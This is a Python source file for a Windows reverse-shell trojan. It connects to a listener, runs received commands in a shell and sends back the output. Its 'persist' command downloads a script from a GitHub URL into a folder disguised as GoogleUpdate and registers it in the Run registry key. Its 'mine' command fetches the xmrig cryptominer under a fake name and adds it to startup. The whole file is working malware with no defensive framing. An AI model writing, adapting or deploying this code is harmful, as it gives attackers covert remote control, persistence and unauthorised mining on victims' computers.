import socket,subprocess,os,getpass,urllib.request

#Globals
IP = "127.0.0.1"
PORT = 8888
user = getpass.getuser()
CopiedPath = (f"C:/Users/{user}/AppData/Roaming/GoogleUpdate/GoogleUpdateHV.py")
CopiedPath2 = (f"C:/Users/{user}/AppData/Roaming/TaskMachine/TaskMachineQC.exe")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))

def persist():
    os.mkdir(os.path.join(os.path.join(os.environ['APPDATA']), 'GoogleUpdate'))
    url = "https://raw.githubusercontent.com/srpentesters/ggg3s/main/ggg3s.py"
    filename = os.path.join(os.path.join(os.environ['APPDATA']), 'GoogleUpdate/GoogleUpdateHV.py')
    urllib.request.urlretrieve(url, filename)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v GoogleUpdateHV /t REG_SZ /d ' + filename, shell=True)

def mine():
    os.mkdir(os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine'))
    url = "https://github.com/srpentesters/ggg3s/blob/main/xmrig.exe?raw=true"
    url2 = "https://raw.githubusercontent.com/srpentesters/ggg3s/main/config.json"
    filenamem = os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine/TaskMachineQC.exe')
    filename2m = os.path.join(os.path.join(os.environ['APPDATA']), 'TaskMachine/config.json')
    urllib.request.urlretrieve(url, filenamem)
    urllib.request.urlretrieve(url2, filename2m)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TaskmachineQC /t REG_SZ /d ' + filenamem, shell=True)

def backup_file(filename, file_data):
    filename_parts = filename.split(".")
    backup_filename = filename_parts[0] + "_backup." + filename_parts[1]
    with open(backup_filename, "w", encoding='utf-8') as f:
        f.write(file_data)

def parse_commands(data):
    if data[:2].decode("utf-8") == 'cd' and len(data[3:].decode("utf-8"))>0:
        try:
            os.chdir(data[3:].decode("utf-8"))
            return "Changed directory to: " + os.getcwd() + "\n"
        except Exception as e:
            return "Error changing directory: " + str(e) + "\n"
    elif data[:7].decode("utf-8") == "persist":
        persist()
        return "Persistent File Added In: " + CopiedPath + "\n"
    elif data[:7].decode("utf-8") == "mine":
        mine()
        return "Miner Added To Startup In: " + CopiedPath2 + "\n"
    elif data[:4].decode("utf-8") == "show":
        try:
            filename = data[5:].decode("utf-8").strip()
            with open(filename, "rb") as f:
                file_data = f.read()
                file_data = file_data.decode("utf-8", "ignore")
                backup_file(filename, file_data)
            return "File Created: " + filename + "_backup" + "\n"
        except Exception as e:
            return "Error reading file: " + str(e) + "\n"
    else:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        return output_str
while True:
    data = s.recv(4096)
    if not data:
        s.send(str.encode("No data received"))
        break
    else:
        result = parse_commands(data)
        s.send(str.encode(result))
s.close()


